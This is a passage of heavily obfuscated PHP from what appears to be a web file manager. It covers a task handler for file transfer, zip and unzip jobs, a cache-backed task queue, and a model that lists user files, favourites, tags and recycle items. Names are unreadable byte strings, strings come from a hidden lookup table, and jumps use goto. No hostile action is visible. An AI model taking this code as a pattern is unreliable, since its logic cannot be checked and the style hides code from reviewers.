$×­í÷²[473] . rand_string(10); if (!$ÈØ¡á»ş) { $ÈØ¡á»ş = $š…ßÇ­ . $×­í÷²[53] . $ÈØ¡á»ş; } switch ($š…ßÇ­) { case $×­í÷²[1758]: if (!$–Ì¡Áî­ || !$–Ì¡Áî­->task) { return echoLog($š…ßÇ­ . $×­í÷²[1860]); } $ •òíÌé = $–Ì¡Áî­; $›‘‰— ´ = $ •òíÌé->task[$×­í÷²[486]]; $š…ßÇ­ = $ •òíÌé->task[$×­í÷²[486]]; if (!$ •òíÌé->task[$×­í÷²[1661]]) { $ •òíÌé->task[$×­í÷²[1661]] = $ÈØ¡á»ş ? $ÈØ¡á»ş : $š…ßÇ­; } break; case $×­í÷²[1861]: if (!$–Ì¡Áî­) { return echoLog($š…ßÇ­ . $×­í÷²[1862]); } $öÖòŞ÷ = is_string($–Ì¡Áî­) ? array($–Ì¡Áî­) : $–Ì¡Áî­; $ •òíÌé = new TaskFileTransfer($›‘‰— ´, $š…ßÇ­, 0, $ÈØ¡á»ş ? $ÈØ¡á»ş : $öÖòŞ÷[0]); foreach ($öÖòŞ÷ as $†ê¾×äŒ) { $ •òíÌé->addPath($†ê¾×äŒ); } break; case $×­í÷²[399]: if (!$–Ì¡Áî­) { return echoLog($š…ßÇ­ . $×­í÷²[1862]); } $öÖòŞ÷ = is_string($–Ì¡Áî­) ? array($–Ì¡Áî­) : $–Ì¡Áî­; $ •òíÌé = new TaskZip($›‘‰— ´, $š…ßÇ­, 0, $ÈØ¡á»ş ? $ÈØ¡á»ş : $öÖòŞ÷[0]); foreach ($öÖòŞ÷ as $†ê¾×äŒ) { $ •òíÌé->addPath($†ê¾×äŒ); } break; case $×­í÷²[1301]: if (!$–Ì¡Áî­) { return echoLog($š…ßÇ­ . $×­í÷²[1862]); } $ •òíÌé = new TaskUnZip($›‘‰— ´, $š…ßÇ­, 0, $ÈØ¡á»ş ? $ÈØ¡á»ş : $–Ì¡Áî­); if ($–Ì¡Áî­) { $ •òíÌé->addFile($–Ì¡Áî­); } break; case $×­í÷²[152]: $ •òíÌé = new TaskHttp($›‘‰— ´, $š…ßÇ­); break; default: return; break; } $this->task = $ •òíÌé; $this->taskID = $›‘‰— ´; Hook::bind($×­í÷²[1796], array($this, $×­í÷²[1863])); Hook::bind($×­í÷²[1798], array($this, $×­í÷²[1864])); Hook::bind($×­í÷²[1792], array($this, $×­í÷²[1865])); echoLog($×­í÷²[1866] . $ •òíÌé->task[$×­í÷²[1661]]); } public function __destruct() { $this->end(); } public function end($ØşĞä„æ = '') { $Ó‡»€É™ =& $_SERVER[±³—úê]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ØşĞä„æ); $this->task = !1; $this->taskID = !1; Hook::unbind($Ó‡»€É™[1796], array($this, $Ó‡»€É™[1863])); Hook::unbind($Ó‡»€É™[1798], array($this, $Ó‡»€É™[1864])); Hook::unbind($Ó‡»€É™[1792], array($this, $Ó‡»€É™[1865])); } public function taskUpdate($â¯‚¡Ò) { $ç°ğÇË =& $_SERVER[±³—úê]; if (!$â¯‚¡Ò || $this->taskID != $â¯‚¡Ò[$ç°ğÇË[486]]) { return; } $÷Æ•Š©ğ = 20; $êÂö…Åè = intval($â¯‚¡Ò[$ç°ğÇË[1777]] * $÷Æ•Š©ğ); $’¾û– = $ç°ğÇË[176] . str_repeat($ç°ğÇË[517], $êÂö…Åè) . $ç°ğÇË[1093] . str_repeat($ç°ğÇË[53], $÷Æ•Š©ğ - $êÂö…Åè) . $ç°ğÇË[178]; $ˆ‡­å = $’¾û– . sprintf($ç°ğÇË[1867], $â¯‚¡Ò[$ç°ğÇË[1777]] * 100) . $ç°ğÇË[1868]; $›¬ŠœÄ¥ = $ˆ‡­å . $â¯‚¡Ò[$ç°ğÇË[1776]] . $ç°ğÇË[8] . $â¯‚¡Ò[$ç°ğÇË[1142]] . LNG($ç°ğÇË[1869]); $ÕÀƒÄ» = $ç°ğÇË[12]; if ($â¯‚¡Ò[$ç°ğÇË[1853]]) { $›¬ŠœÄ¥ = $ˆ‡­å . size_format($â¯‚¡Ò[$ç°ğÇË[1776]]) . $ç°ğÇË[8] . size_format($â¯‚¡Ò[$ç°ğÇË[1142]]); $ÕÀƒÄ» = size_format($â¯‚¡Ò[$ç°ğÇË[1778]]) . $ç°ğÇË[1870]; } if ($â¯‚¡Ò[$ç°ğÇË[1144]]) { $â¯‚¡Ò[$ç°ğÇË[1827]] = $â¯‚¡Ò[$ç°ğÇË[1144]] . $ç°ğÇË[53] . $â¯‚¡Ò[$ç°ğÇË[1827]]; } if ($â¯‚¡Ò[$ç°ğÇË[1827]]) { $Ì»’ÜÃ = $ç°ğÇË[12]; if ($â¯‚¡Ò[$ç°ğÇË[1829]]) { $Ì»’ÜÃ = $ç°ğÇË[50] . size_format($â¯‚¡Ò[$ç°ğÇË[1830]]) . $ç°ğÇË[8] . size_format($â¯‚¡Ò[$ç°ğÇË[1829]]); } $ÕÀƒÄ» .= $â¯‚¡Ò[$ç°ğÇË[1827]] . $Ì»’ÜÃ; } if ($â¯‚¡Ò[$ç°ğÇË[843]] && !$â¯‚¡Ò[$ç°ğÇË[1829]]) { $ÕÀƒÄ» .= $ç°ğÇË[53] . size_format($â¯‚¡Ò[$ç°ğÇË[1834]]) . $ç°ğÇË[8] . size_format($â¯‚¡Ò[$ç°ğÇË[843]]); } echoLog($›¬ŠœÄ¥ . $ç°ğÇË[53] . $ÕÀƒÄ», !0); } public function taskEnd($§ ¨›ë) { $ÔÂ =& $_SERVER[±³—úê]; if (!$§ ¨›ë || $this->taskID != $§ ¨›ë[$ÔÂ[486]]) { return; } $‚äÛ‚†€ = $§ ¨›ë ? $§ ¨›ë[$ÔÂ[1776]] . $ÔÂ[8] . $§ ¨›ë[$ÔÂ[1142]] . LNG($ÔÂ[1869]) . $ÔÂ[74] : $ÔÂ[12]; echoLog($ÔÂ[1871] . $§ ¨›ë[$ÔÂ[1661]] . ($§ ¨›ë[$ÔÂ[537]] ? $ÔÂ[74] . $§ ¨›ë[$ÔÂ[537]] : $ÔÂ[12]) . $ÔÂ[74] . $‚äÛ‚†€ . $ÔÂ[1872] . sprintf($ÔÂ[932], timeFloat() - $§ ¨›ë[$ÔÂ[1779]]) . $ÔÂ[1791]); $this->end(); } public function taskKill($ŒúßãÀ¡) { $ú±ßÓè =& $_SERVER[±³—úê]; if (!$ŒúßãÀ¡ || $this->taskID != $ŒúßãÀ¡[$ú±ßÓè[486]]) { return; } echoLog($ú±ßÓè[1873] . $ŒúßãÀ¡[$ú±ßÓè[1661]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\153\121\x75\145\x75\145\114\145\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\141\163\x6b\x51\165\x65\x75\x65\x44\x61\164\x61"; const QUEUE_TIME = "\x74\x61\x73\x6b\x51\x75\145\165\145\x4c\141\163\x74\x52\165\x6e"; const QUEUE_THREAD = "\164\x61\163\x6b\x51\165\145\x75\x65\x54\x68\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($£³Ô«Öú, $·àÇ“äó = array(), $şïÂ¯— = '', $¥ç»¾…ú = '') { $ß´‘¨ì  =& $_SERVER[±³—úê]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¥ç»¾…ú && array_find_by_field(self::$listData, $ß´‘¨ì [97], $¥ç»¾…ú)) { return !0; } if ($¥ç»¾…ú && array_find_by_field(self::$listDataAdd, $ß´‘¨ì [97], $¥ç»¾…ú)) { return !0; } self::$listDataAdd[] = array($ß´‘¨ì [352] => $£³Ô«Öú, $ß´‘¨ì [1874] => $·àÇ“äó, $ß´‘¨ì [537] => $şïÂ¯—, $ß´‘¨ì [97] => $¥ç»¾…ú); return !0; } public static function addSubmit() { $ê–óÈï¢ =& $_SERVER[±³—úê]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ê–óÈï¢[1875] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ê–óÈï¢[12], $ê–óÈï¢[537])), $ê–óÈï¢[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ÖˆÅµ–ç, $ÔÀªë¯¦ = array(), $‘¢½åÓ´ = '', $ğâ˜ˆÅ„ = '') { $•„‡î¶Ô =& $_SERVER[±³—úê]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ßÜ¸«š  = self::getAll(); if ($ğâ˜ˆÅ„ && array_find_by_field($ßÜ¸«š , $•„‡î¶Ô[97], $ğâ˜ˆÅ„)) { return !0; } $ßÜ¸«š [] = array($•„‡î¶Ô[352] => $ÖˆÅµ–ç, $•„‡î¶Ô[1874] => $ÔÀªë¯¦, $•„‡î¶Ô[537] => $‘¢½åÓ´, $•„‡î¶Ô[97] => $ğâ˜ˆÅ„); self::setAll($ßÜ¸«š ); write_log($•„‡î¶Ô[1875] . $‘¢½åÓ´, $•„‡î¶Ô[197]); return !0; } public static function run() { $—Çø£îñ =& $_SERVER[±³—úê]; $¨–ßÌ„³ = self::getAll(); $”Æš©—Ö = array_shift($¨–ßÌ„³); if (!$”Æš©—Ö) { return !1; } self::setAll($¨–ßÌ„³); $î¿¤ì®ã = timeFloat(); $¶€ğÏ±ş = $—Çø£îñ[12]; try { $¶€ğÏ±ş = Hook::apply($”Æš©—Ö[$—Çø£îñ[352]], $”Æš©—Ö[$—Çø£îñ[1874]]); } catch (Exception $Ü•ß¡¸ˆ) { write_log($Ü•ß¡¸ˆ, $—Çø£îñ[1266]); } $ÒÕø¶ = number_format(timeFloat() - $î¿¤ì®ã, 3) . $—Çø£îñ[1791]; if ($¶€ğÏ±ş && is_string($¶€ğÏ±ş)) { $ÒÕø¶ = $ÒÕø¶ . $—Çø£îñ[1876] . $¶€ğÏ±ş; } write_log($—Çø£îñ[1877] . $”Æš©—Ö[$—Çø£îñ[537]] . $—Çø£îñ[1878] . $ÒÕø¶, $—Çø£îñ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $â­»ÃÉâ =& $_SERVER[±³—úê]; $É¶ä¿³ = self::threadCount() + 1; if ($É¶ä¿³ > 3 || !self::count()) { return; } write_log($â­»ÃÉâ[1879] . $É¶ä¿³, $â­»ÃÉâ[197]); Cache::set(self::QUEUE_THREAD, $É¶ä¿³, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($â­»ÃÉâ[1880], $â­»ÃÉâ[197]); } public static function getKey($şÍåì…ß, $£ùåå = "\151\156\164") { $ä¡Ê«Š± =& $_SERVER[±³—úê]; Cache::removeMemory($şÍåì…ß); $ôÓ–ö‚ì = Cache::get($şÍåì…ß); if ($£ùåå == $ä¡Ê«Š±[374]) { return $ôÓ–ö‚ì ? intval($ôÓ–ö‚ì) : 0; } if ($£ùåå == $ä¡Ê«Š±[1881]) { return is_array($ôÓ–ö‚ì) ? $ôÓ–ö‚ì : array(); } return $ôÓ–ö‚ì; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[±³—úê][1881]); } public static function setAll($Å¿îï) { $Üòú†Ğ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Å¿îï), $Üòú†Ğ); Cache::set(self::QUEUE_DATA, $Å¿îï, $Üòú†Ğ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto F¸‚êãÖ´ˆ; b£Á©Ñ„¯ë: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\x6d\x65" => "\151\x6f\137\x73\157\165\x72\143\145\x5f\155\x65\x74\141", "\155\x65\x74\141\106\x69\145\x6c\x64" => "\x73\157\x75\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\155\157\x64\x69\x66\171\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74", "\146\165\156\x63\164\151\x6f\x6e"), array("\143\x72\x65\x61\164\x65\124\151\x6d\145", "\x74\x69\x6d\145", "\x69\156\163\145\x72\x74", "\x66\165\x6e\143\164\x69\x6f\156"), array("\x76\151\145\167\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\156\163\145\162\x74", "\146\165\x6e\x63\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ºåëë÷¾) { return $this->listSource(array($_SERVER[±³—úê][488] => $ºåëë÷¾)); } public function typeName($£×Òèòæ) { static $„Ñæ’×œ = array(self::TYPE_SYSTEM => "\163\171\163\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\157\165\160"); return $„Ñæ’×œ[$£×Òèòæ . $_SERVER[±³—úê][12]]; } public function sourceListInfo($ñèŸŠ, $ªÃûû¿¤ = false) { $ÄÀçÏò =& $_SERVER[±³—úê]; $ñèŸŠ = $ñèŸŠ ? $ñèŸŠ : array(); $ñèŸŠ = array_filter(array_unique($ñèŸŠ)); if (!$ñèŸŠ) { return array(); } $ì·ş§½… = $this->where(array($ÄÀçÏò[193] => array($ÄÀçÏò[7], $ñèŸŠ)))->select(); $this->_listDataApply($ì·ş§½…, $ªÃûû¿¤); return array_to_keyvalue($ì·ş§½…, $ÄÀçÏò[193]); } public function pathInfoFilter(&$áöåÊ‰Ÿ) { $ª”åÒ‹Ñ =& $_SERVER[±³—úê]; static $†‘Òéˆ = false; static $åÄÎ•ï— = false; static $÷¡ã“í = false; if (!$†‘Òéˆ) { $é›˜½¶ä = $ª”åÒ‹Ñ[489]; $é›˜½¶ä .= $ª”åÒ‹Ñ[490]; $é›˜½¶ä .= $ª”åÒ‹Ñ[491]; $Èà½ÍÌç = $ª”åÒ‹Ñ[492]; $êò¤º¤š = explode($ª”åÒ‹Ñ[50], $Èà½ÍÌç); $†‘Òéˆ = explode($ª”åÒ‹Ñ[50], $é›˜½¶ä); $åÄÎ•ï— = array(); foreach ($†‘Òéˆ as $¥ä Ä‚) { if (in_array($¥ä Ä‚, $êò¤º¤š)) { continue; } $åÄÎ•ï—[] = $¥ä Ä‚; } $÷¡ã“í = explode($ª”åÒ‹Ñ[50], $ª”åÒ‹Ñ[493]); } foreach ($÷¡ã“í as $’Ãß±Òš) { if (isset($áöåÊ‰Ÿ[$’Ãß±Òš])) { $áöåÊ‰Ÿ[$’Ãß±Òš] = intval($áöåÊ‰Ÿ[$’Ãß±Òš]); } } $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[87]] = $ª”åÒ‹Ñ[494] . $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[193]] . $ª”åÒ‹Ñ[495]; $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[33]] = $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[496]] == 1 ? $ª”åÒ‹Ñ[78] : $ª”åÒ‹Ñ[242]; $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[190]] = $this->typeName($áöåÊ‰Ÿ[$ª”åÒ‹Ñ[190]]); if ($áöåÊ‰Ÿ[$ª”åÒ‹Ñ[496]] != 1) { $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[169]] = $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[497]]; unset($áöåÊ‰Ÿ[$ª”åÒ‹Ñ[497]]); } $àñÈ³€‚ = $†‘Òéˆ; if (isset($áöåÊ‰Ÿ[$ª”åÒ‹Ñ[498]]) && $áöåÊ‰Ÿ[$ª”åÒ‹Ñ[498]][$ª”åÒ‹Ñ[499]] == -1) { $àñÈ³€‚ = $åÄÎ•ï—; } $áöåÊ‰Ÿ = array_field_key($áöåÊ‰Ÿ, $àñÈ³€‚); return $áöåÊ‰Ÿ; } public function listUserFav() { $âŞ•˜Ä¢ =& $_SERVER[±³—úê]; $ö©ßú‹Õ = Model($âŞ•˜Ä¢[500])->listData(); $ËŸÍ¿ëÏ = array_filter_by_field($ö©ßú‹Õ, $âŞ•˜Ä¢[33], $âŞ•˜Ä¢[501]); $ËŸÍ¿ëÏ = array_to_keyvalue($ËŸÍ¿ëÏ, $âŞ•˜Ä¢[12], $âŞ•˜Ä¢[87]); if ($ËŸÍ¿ëÏ) { $ãüµâŞ× = $this->listSource(array($âŞ•˜Ä¢[502] => array($âŞ•˜Ä¢[503], $ËŸÍ¿ëÏ))); } $ãüµâŞ× = array_to_keyvalue($ãüµâŞ×[$âŞ•˜Ä¢[456]], $âŞ•˜Ä¢[193]); foreach ($ö©ßú‹Õ as &$Öàúñ½æ) { $Öàúñ½æ = array($âŞ•˜Ä¢[504] => $Öàúñ½æ[$âŞ•˜Ä¢[486]], $âŞ•˜Ä¢[505] => $Öàúñ½æ[$âŞ•˜Ä¢[32]], $âŞ•˜Ä¢[506] => $Öàúñ½æ[$âŞ•˜Ä¢[87]], $âŞ•˜Ä¢[507] => $Öàúñ½æ[$âŞ•˜Ä¢[33]], $âŞ•˜Ä¢[508] => $Öàúñ½æ[$âŞ•˜Ä¢[243]], $âŞ•˜Ä¢[509] => $Öàúñ½æ[$âŞ•˜Ä¢[88]]); if ($Öàúñ½æ[$âŞ•˜Ä¢[33]] == $âŞ•˜Ä¢[501] && $ãüµâŞ×[$Öàúñ½æ[$âŞ•˜Ä¢[87]]]) { $Öàúñ½æ[$âŞ•˜Ä¢[90]] = $ãüµâŞ×[$Öàúñ½æ[$âŞ•˜Ä¢[87]]]; } } unset($Öàúñ½æ); return $ö©ßú‹Õ; } public function listUserTag($¨èéÎ¦) { $Æ®ûš€¤ =& $_SERVER[±³—úê]; if ($¨èéÎ¦ && !is_array($¨èéÎ¦)) { $¨èéÎ¦ = array($¨èéÎ¦); } $ù¢Ø¶ô = Model($Æ®ûš€¤[510])->listData(); $í˜¿Š½ø = array(); $—¢¿“°€ = array(); foreach ($ù¢Ø¶ô as $üúŸÛ) { $À”µÃ‘ = $üúŸÛ[$Æ®ûš€¤[87]]; if (!$À”µÃ‘) { continue; } if (!isset($—¢¿“°€[$À”µÃ‘])) { $—¢¿“°€[$À”µÃ‘] = array(); } $—¢¿“°€[$À”µÃ‘][] = $üúŸÛ[$Æ®ûš€¤[511]]; $í˜¿Š½ø[$üúŸÛ[$Æ®ûš€¤[87]]] = $üúŸÛ; } $â™‹¤ä = array(); $—ùÑÙ = array(); $‘ãÚİå = array(); foreach ($—¢¿“°€ as $û¥‘…Ê => $ó¦½ÇÈ») { $ÍÛæ»ì– = !0; if (!$¨èéÎ¦) { $â™‹¤ä[] = $û¥‘…Ê; continue; } foreach ($¨èéÎ¦ as $õê¶“Ìñ) { if (!in_array($õê¶“Ìñ, $ó¦½ÇÈ»)) { $ÍÛæ»ì– = !1; break; } } if (!$ÍÛæ»ì–) { continue; } if (!is_numeric($û¥‘…Ê)) { $¢—§¨ÆÓ = $í˜¿Š½ø[$û¥‘…Ê]; $ê×Š…ÆÈ = array($Æ®ûš€¤[32] => $¢—§¨ÆÓ[$Æ®ûš€¤[32]], $Æ®ûš€¤[87] => $¢—§¨ÆÓ[$Æ®ûš€¤[87]], $Æ®ûš€¤[33] => $¢—§¨ÆÓ[$Æ®ûš€¤[33]], $Æ®ûš€¤[90] => array($Æ®ûš€¤[512] => 1), $Æ®ûš€¤[244] => !0); if ($¢—§¨ÆÓ[$Æ®ûš€¤[33]] == $Æ®ûš€¤[242]) { $‘ãÚİå[] = $ê×Š…ÆÈ; } if ($¢—§¨ÆÓ[$Æ®ûš€¤[33]] == $Æ®ûš€¤[78]) { $—ùÑÙ[] = $ê×Š…ÆÈ; } continue; } $â™‹¤ä[] = $û¥‘…Ê; } if ($â™‹¤ä) { $µşÕ’‡ö = $this->listSource(array($Æ®ûš€¤[502] => array($Æ®ûš€¤[503], $â™‹¤ä))); } $µşÕ’‡ö = $µşÕ’‡ö ? $µşÕ’‡ö : array($Æ®ûš€¤[85] => array(), $Æ®ûš€¤[86] => array()); $µşÕ’‡ö[$Æ®ûš€¤[85]] = array_merge($µşÕ’‡ö[$Æ®ûš€¤[85]], $—ùÑÙ); $µşÕ’‡ö[$Æ®ûš€¤[86]] = array_merge($µşÕ’‡ö[$Æ®ûš€¤[86]], $‘ãÚİå); if (isset($µşÕ’‡ö[$Æ®ûš€¤[453]]) && count($â™‹¤ä) == $µşÕ’‡ö[$Æ®ûš€¤[453]][$Æ®ûš€¤[454]]) { return $µşÕ’‡ö; } $à¤–œğ = array(); $ÓÍÌúËµ = array_to_keyvalue($µşÕ’‡ö[$Æ®ûš€¤[85]], $Æ®ûš€¤[12], $Æ®ûš€¤[193]); $Ÿæ‹›ôß = array_to_keyvalue($µşÕ’‡ö[$Æ®ûš€¤[86]], $Æ®ûš€¤[12], $Æ®ûš€¤[193]); $Ÿì¿——µ = array_merge($Ÿæ‹›ôß, $ÓÍÌúËµ); foreach ($â™‹¤ä as $À”µÃ‘) { if (!in_array($À”µÃ‘, $Ÿì¿——µ)) { $à¤–œğ[] = $À”µÃ‘; } } if ($à¤–œğ) { Model($Æ®ûš€¤[513])->removeBySource($à¤–œğ); } return $µşÕ’‡ö; } public function listUserRecycle() { $·Ê§Ûá =& $_SERVER[±³—úê]; $×Õøü¾¬ = Model($·Ê§Ûá[514])->listData(); if (!$×Õøü¾¬) { return array(); } $Î×âµù = array($·Ê§Ûá[502] => array($·Ê§Ûá[503], $×Õøü¾¬), $·Ê§Ûá[515] => 1); return $this->listSource($Î×âµù); } public function listSource($Ì„±ÜÔÌ, $âäÅÁ÷Š = 3000, $şÔ´ºï = false) { $ıªÈ¾òÈ =& $_SERVER[±³—úê]; if (!isset($Ì„±ÜÔÌ[$ıªÈ¾òÈ[516]])) { $Ì„±ÜÔÌ[$ıªÈ¾òÈ[516]] = 0; } if (isset($Ì„±ÜÔÌ[$ıªÈ¾òÈ[192]]) && $Ì„±ÜÔÌ[$ıªÈ¾òÈ[192]] == $ıªÈ¾òÈ[240]) { $Ì„±ÜÔÌ[$ıªÈ¾òÈ[497]] = array($ıªÈ¾òÈ[517], $ıªÈ¾òÈ[12]); } $¿è©¹ê˜ = $ıªÈ¾òÈ[518]; $ğ³Ô©¥Ã = $this->field($¿è©¹ê˜)->_makeOrder()->where($Ì„±ÜÔÌ)->selectPage($âäÅÁ÷Š); $this->_listPageCheck($ğ³Ô©¥Ã, $¿è©¹ê˜, $Ì„±ÜÔÌ); $this->_listDataApply($ğ³Ô©¥Ã[$ıªÈ¾òÈ[456]], $şÔ´ºï); $this->_listMake($ğ³Ô©¥Ã); return $ğ³Ô©¥Ã; } private function _listPageCheck(&$İ‡°§¯, $‡Áõç•ı, $İÄÏÉşì) { $ÂæÃÍÖ =& $_SERVER[±³—úê]; if (!is_array($İ‡°§¯[$ÂæÃÍÖ[453]])) { return; } $£‹±•ô = $İ‡°§¯[$ÂæÃÍÖ[453]]; if ($£‹±•ô[$ÂæÃÍÖ[455]] <= 1) { return; } if ($£‹±•ô[$ÂæÃÍÖ[454]] >= 100000) { return; } if (Model($ÂæÃÍÖ[519])->get($ÂæÃÍÖ[520]) != $ÂæÃÍÖ[521]) { return; } $‡Áõç•ı = str_replace(array($ÂæÃÍÖ[53], $ÂæÃÍÖ[428], $ÂæÃÍÖ[221]), $ÂæÃÍÖ[12], $‡Áõç•ı); $‡Áõç•ı = $ÂæÃÍÖ[522] . str_replace($ÂæÃÍÖ[50], $ÂæÃÍÖ[523], $‡Áõç•ı) . $ÂæÃÍÖ[524]; $œı¥ª«œ = $ÂæÃÍÖ[525]; $œı¥ª«œ = $œı¥ª«œ . $ÂæÃÍÖ[526]; $Æ–“¥­ğ = $£‹±•ô[$ÂæÃÍÖ[450]] * ($£‹±•ô[$ÂæÃÍÖ[439]] - 1) . $ÂæÃÍÖ[50] . $£‹±•ô[$ÂæÃÍÖ[450]]; $¦™Ä¾¶ = $this->_makeOrder(!0); $¢«„“È¢ = $ÂæÃÍÖ[522] . str_replace($ÂæÃÍÖ[50], $ÂæÃÍÖ[523], $¦™Ä¾¶[0]); if (strpos($¢«„“È¢, $ÂæÃÍÖ[527])) { $¢«„“È¢ = str_replace($ÂæÃÍÖ[527], $ÂæÃÍÖ[528], $¢«„“È¢); } else { $¢«„“È¢ .= $ÂæÃÍÖ[529] . $¦™Ä¾¶[1]; } $Ä°ÃÑ™¥ = array(); foreach ($İÄÏÉşì as $°Œüæş¤ => $ÈºÕ­ì†) { $Ä°ÃÑ™¥[$ÂæÃÍÖ[522] . $°Œüæş¤] = $ÈºÕ­ì†; } $this->alias($ÂæÃÍÖ[530])->field($‡Áõç•ı)->limit($Æ–“¥­ğ)->order($¢«„“È¢); $ã¬Ò¨ß· = $this->join($œı¥ª«œ)->where($Ä°ÃÑ™¥)->select(); if ($ã¬Ò¨ß·) { $İ‡°§¯[$ÂæÃÍÖ[456]] = $ã¬Ò¨ß·; } } protected function _makeOrder($Í•İóÇ™ = false) { $¶âÛÀÒ =& $_SERVER[±³—úê]; $×Í“ùˆé = Model($¶âÛÀÒ[531])->get($¶âÛÀÒ[532]); $½¦Ö¡ = Model($¶âÛÀÒ[531])->get($¶âÛÀÒ[533]); $Ü€ßãÅ¦ = array($¶âÛÀÒ[534] => $¶âÛÀÒ[535], $¶âÛÀÒ[536] => $¶âÛÀÒ[537]); $òÄÃàá = array($¶âÛÀÒ[32] => $¶âÛÀÒ[32], $¶âÛÀÒ[79] => $¶âÛÀÒ[79], $¶âÛÀÒ[169] => $¶âÛÀÒ[497], $¶âÛÀÒ[538] => $¶âÛÀÒ[538], $¶âÛÀÒ[539] => $¶âÛÀÒ[540], $¶âÛÀÒ[243] => $¶âÛÀÒ[243], $¶âÛÀÒ[88] => $¶âÛÀÒ[88]); $À¿™Ü† = Input::get($¶âÛÀÒ[541], $¶âÛÀÒ[7], $×Í“ùˆé, array_keys($òÄÃàá)); $¥œòÊ®„ = Input::get($¶âÛÀÒ[542], $¶âÛÀÒ[7], $½¦Ö¡, array_keys($Ü€ßãÅ¦)); if (!in_array($À¿™Ü†, array_keys($òÄÃàá))) { $À¿™Ü† = $¶âÛÀÒ[32]; } if (!in_array($¥œòÊ®„, array_keys($Ü€ßãÅ¦))) { $À¿™Ü† = $¶âÛÀÒ[534]; } if ($À¿™Ü† == $¶âÛÀÒ[32]) { } $Ô¬‡Ï“ê = $¶âÛÀÒ[543] . $òÄÃàá[$À¿™Ü†] . $¶âÛÀÒ[53] . $Ü€ßãÅ¦[$¥œòÊ®„]; $Ô¬‡Ï“ê = rtrim(trim($Ô¬‡Ï“ê), $¶âÛÀÒ[50]); if ($Í•İóÇ™) { return array($Ô¬‡Ï“ê, $Ü€ßãÅ¦[$¥œòÊ®„]); } return $this->order($Ô¬‡Ï“ê); } protected function _listDataApplyItem($ğíÙşËº, $´ã = false) { $Æš–÷„ = array($ğíÙşËº); $this->_listDataApply($Æš–÷„, $´ã); return $Æš–÷„[0]; } protected function _listDataApply(&$«Ò”£ï†, $”ÑêÀÓ = false) { $ø¹¼õ©½ =& $_SERVER[±³—úê]; if (!$«Ò”£ï†) { $«Ò”£ï† = array(); return; } $ÀóŒ¨ñÈ = array_to_keyvalue($«Ò”£ï†, $ø¹¼õ©½[12], $ø¹¼õ©½[193]); $ÀóŒ¨ñÈ = array_unique($ÀóŒ¨ñÈ); $this->_listSourceCache($«Ò”£ï†); if (!$”ÑêÀÓ) { $this->_listAppendMeta($«Ò”£ï†, $ÀóŒ¨ñÈ); $this->_listAppendFileMeta($«Ò”£ï†, $ÀóŒ¨ñÈ); $this->_listAppendChildren($«Ò”£ï†, $ÀóŒ¨ñÈ); } $this->_listAppendPath($«Ò”£ï†); $this->_listAppendAuth($«Ò”£ï†); $this->_listAppendSourceInfo($«Ò”£ï†, $ÀóŒ¨ñÈ); $this->_listAppendUser($«Ò”£ï†); $this->_listFilterInfo($«Ò”£ï†, $”ÑêÀÓ); $this->_listAppendAuthSecret($«Ò”£ï†); } protected function _listSourceCache($¥ş‘¹›¼) { $¨ÔèÆ =& $_SERVER[±³—úê]; foreach ($¥ş‘¹›¼ as $©Ü¬åÔ¹) { self::$cacheSourceInfo[$¨ÔèÆ[544] . $©Ü¬åÔ¹[$¨ÔèÆ[193]]] = $©Ü¬åÔ¹; } } protected function _listFilterInfo(&$µ»ú“ó, $€¼Ûíı¤ = false) { $ù±‡¤Õ =& $_SERVER[±³—úê]; foreach ($µ»ú“ó as &$Ú«îŒ§¶) { $Ú«îŒ§¶ = $this->pathInfoFilter($Ú«îŒ§¶); self::$cachePathInfo[$ù±‡¤Õ[545] . intval($€¼Ûíı¤) . $ù±‡¤Õ[473] . $Ú«îŒ§¶[$ù±‡¤Õ[193]]] = $Ú«îŒ§¶; } unset($Ú«îŒ§¶); } protected function _listMake(&$Îšğ˜®Î) { $É¤‰·½× =& $_SERVER[±³—úê]; $Îšğ˜®Î[$É¤‰·½×[85]] = array(); $Îšğ˜®Î[$É¤‰·½×[86]] = array(); foreach ($Îšğ˜®Î[$É¤‰·½×[456]] as $’¢£´¡) { $•íÔëŠ = $’¢£´¡[$É¤‰·½×[496]] == 1 ? 